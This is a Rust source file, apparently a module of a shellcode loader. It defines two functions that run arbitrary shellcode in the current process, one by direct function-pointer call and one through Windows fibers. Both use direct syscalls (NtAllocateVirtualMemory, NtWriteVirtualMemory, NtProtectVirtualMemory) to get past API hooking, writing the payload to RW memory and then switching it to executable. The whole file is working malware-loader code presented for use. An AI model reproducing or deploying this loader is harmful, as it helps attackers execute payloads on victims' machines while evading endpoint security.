use rust_syscalls::syscall;
use std::ffi::c_void;

// =======================================================================================================
// DEFAULT SHELLCODE EXECUTION (LOCAL)
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteDefault")]
use windows::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "ShellcodeExecuteDefault")]
use windows::Win32::Foundation::HANDLE;

#[cfg(feature = "ShellcodeExecuteDefault")]
pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
{
    // Use -1 as handle for current process (standard Windows convention)
    let process_handle: HANDLE = HANDLE(-1isize);
    let mut base_address: *mut c_void = std::ptr::null_mut();

    let mut region_size: usize = bytes_to_load.len();
    let allocation_type: u32 = 0x1000;
    let mut return_value: i32;
    let mut bytes_written: usize = 0;
    let mut oldprotect: u32 = 0;
    unsafe
    {
        return_value = syscall!("NtAllocateVirtualMemory", process_handle, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
    }
    if return_value != 0 {
        return false;
    }
    let shellcode_ptr = bytes_to_load.as_ptr() as *const c_void;
    unsafe
    {
        return_value = syscall!("NtWriteVirtualMemory", process_handle, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
    }
    if return_value != 0 {
        return false;
    }
    let mut protectaddress_to_protect: *mut c_void = base_address;
    let mut size_to_set = bytes_to_load.len();
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
    }
    if return_value != 0 {
        return false;
    }
    unsafe {
        let function: extern "C" fn() = std::mem::transmute(base_address);
        (function)();
    }
    return true;
}

// =======================================================================================================
// FIBER-BASED SHELLCODE EXECUTION (LOCAL)
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteFiber")]
use windows::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
    LPFIBER_START_ROUTINE,
};

#[cfg(feature = "ShellcodeExecuteFiber")]
struct Fiber {
    shellcode_fiber_address: *mut c_void,
    primary_fiber_address: *mut c_void,
}

#[cfg(feature = "ShellcodeExecuteFiber")]
impl Drop for Fiber {
    fn drop(&mut self) {
        unsafe {
            if !self.shellcode_fiber_address.is_null() {
                DeleteFiber(self.shellcode_fiber_address);
            }
            if !self.primary_fiber_address.is_null() {
                DeleteFiber(self.primary_fiber_address);
            }
        }
    }
}

#[cfg(feature = "ShellcodeExecuteFiber")]
pub fn shellcode_execute_fiber(bytes_to_load: Vec<u8>) -> bool {
    unsafe {
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = bytes_to_load.len();
        let allocation_type: u32 = 0x1000;
        let mut return_value: i32;
        
        // Allocate memory with RW permissions
        return_value = syscall!("NtAllocateVirtualMemory", -1isize, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
        if return_value != 0 {
            return false;
        }
        
        // Write shellcode to allocated memory
        let shellcode_ptr = bytes_to_load.as_ptr() as *const c_void;
        let mut bytes_written: usize = 0;
        return_value = syscall!("NtWriteVirtualMemory", -1isize, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
        if return_value != 0 {
            return false;
        }
        
        // Change memory protection to RX
        let mut protectaddress_to_protect: *mut c_void = base_address;
        let mut size_to_protect = bytes_to_load.len();
        let mut oldprotect: u32 = 0;
        return_value = syscall!("NtProtectVirtualMemory", -1isize, &mut protectaddress_to_protect, &mut size_to_protect, 0x20, &mut oldprotect);
        if return_value != 0 {
            return false;
        }
        
        let mut fiber: Fiber = std::mem::zeroed();
        
        // Create fiber from shellcode address
        fiber.shellcode_fiber_address = CreateFiber(
            0, 
            std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address), 
            None
        );
        if fiber.shellcode_fiber_address.is_null() {
            return false;
        }
        
        // Convert current thread to fiber
        fiber.primary_fiber_address = ConvertThreadToFiber(None);
        if fiber.primary_fiber_address.is_null() {
            return false;
        }

        // Switch execution to shellcode fiber
        SwitchToFiber(fiber.shellcode_fiber_address);
    }
    
    true
}
